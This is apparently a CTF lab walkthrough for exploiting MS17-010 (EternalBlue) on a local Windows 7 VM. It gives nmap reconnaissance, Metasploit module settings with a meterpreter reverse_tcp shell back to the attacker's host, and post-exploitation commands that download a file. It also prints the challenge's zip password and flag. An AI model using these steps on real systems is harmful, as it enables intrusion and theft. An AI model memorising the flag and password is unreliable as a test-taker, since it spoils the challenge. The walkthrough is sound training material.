# Control Room Challenge 3

# 🎯 CTF Challenge: EternalBlue Walkthrough

## 📋 Challenge Info

| Field | Detail |
|-------|--------|
| Name | Corporate Breach - EternalBlue |
| Category | Exploitation |
| Difficulty | Easy |
| Points | 200 |
| Flag Format | CTF{...} |
| Target OS | Windows 7 SP1 |

---

## 📊 Attack Flow Summary

```
Import OVA → Start VM
    ↓
Nmap Scan → Found port 445 vulnerable to MS17-010
    ↓
Metasploit EternalBlue exploit
    ↓
Got Meterpreter (NT AUTHORITY\SYSTEM)
    ↓
Download flag.zip from C:\Users\blue\Desktop
    ↓
Extract with password
    ↓
Submit flag! 🎉
```

---

## 🖥️ Setting Up the Target Machine

You will be provided with an `.ova` file to run the vulnerable target machine.
You can use **VMware Player (free)** or **VMware Workstation** to import and run it.

### Option 1: Import OVA via VMware Player

1. Download and install **VMware Workstation Player** (free):
   - https://www.vmware.com/products/workstation-player.html

2. Open VMware Player

3. Click **"Open a Virtual Machine"**

4. Select the provided `.ova` file

5. Choose a storage location for the VM

6. Click **Import** and wait for the process to complete

7. Once imported, click **"Play Virtual Machine"** to start it

8. Wait for Windows 7 to fully boot

> ⚠️ **Do NOT log in to the machine.** The challenge must be solved through exploitation only.

---

### Option 2: Import OVA via VMware Workstation

1. Open VMware Workstation

2. Go to **File → Open**

3. Select the provided `.ova` file

4. Choose a storage location and click **Import**

5. Once imported, power on the VM

> ⚠️ **Do NOT log in to the machine.** The challenge must be solved through exploitation only.

---

### 📌 Network Configuration

After importing the VM, make sure the network adapter is set to:

```
VMware Player/Workstation → VM Settings → Network Adapter → NAT or Host-Only
```

Note the IP address of the target machine — you will need it for the exploit.

To find the target IP from your Kali Linux:

```bash
# Scan your subnet for the target
nmap -sn <youriparea>/24
```

---

## 🔧 Required Tools

- Kali Linux
- Metasploit Framework
- Nmap

---

## 📌 Phase 1: Reconnaissance

```bash
# 1. Scan target for open ports
nmap -sV -sC -p 135,139,445 <TARGET_IP>

# Expected output:
# PORT    STATE SERVICE      VERSION
# 135/tcp open  msrpc
# 139/tcp open  netbios-ssn
# 445/tcp open  microsoft-ds Windows 7 SP1

# 2. Check MS17-010 vulnerability
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# Expected output:
# | smb-vuln-ms17-010:
# |   VULNERABLE:
# |   Remote Code Execution vulnerability in Microsoft SMBv1
# |     State: VULNERABLE
```

---

## 📌 Phase 2: Exploitation via Metasploit

```bash
# 1. Open Metasploit
msfconsole

# 2. Run scanner first to confirm vulnerability
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# Expected output:
# [+] <TARGET_IP>:445 - Host is likely VULNERABLE to MS17-010!

# 3. Load EternalBlue exploit
use exploit/windows/smb/ms17_010_eternalblue

# 4. Set options
set RHOSTS <TARGET_IP>
set LHOST <KALI_IP>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 5. Run the exploit
run
```

### ✅ Expected Output

```
[*] Started reverse TCP handler on <KALI_IP>:4444
[*] Sending stage to <TARGET_IP>
[*] Meterpreter session 1 opened
meterpreter >
```

---

## 📌 Phase 3: Post Exploitation

```bash
# 1. Check current privilege
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

# 2. Check system info
meterpreter > sysinfo

# 3. Navigate to user blue's Desktop
meterpreter > cd "C:\\Users\\blue\\Desktop"

# 4. List folder contents
meterpreter > ls
# flag.zip

# 5. Download flag.zip to Kali Linux
meterpreter > download flag.zip /tmp/flag.zip

# 6. Background the session
meterpreter > background
```

---

## 📌 Phase 4: Extract the Flag

```bash
# 1. Navigate to /tmp
cd /tmp

# 2. Extract ZIP with password
# 💡 Hint: The password can be found in the "CCTV Server" challenge
unzip -P u9getit_Br0 flag.zip

# 3. Read the flag
cat flag.txt
```

---

## 🏁 Submit Flag

```
PrisonCTF{3t3rn4l_blu3_pwn3d_dc_2024}

```

---

> ⚠️ **Disclaimer:** This walkthrough is strictly for educational purposes and CTF competitions only.
> Do not use these techniques outside of an authorized CTF environment.
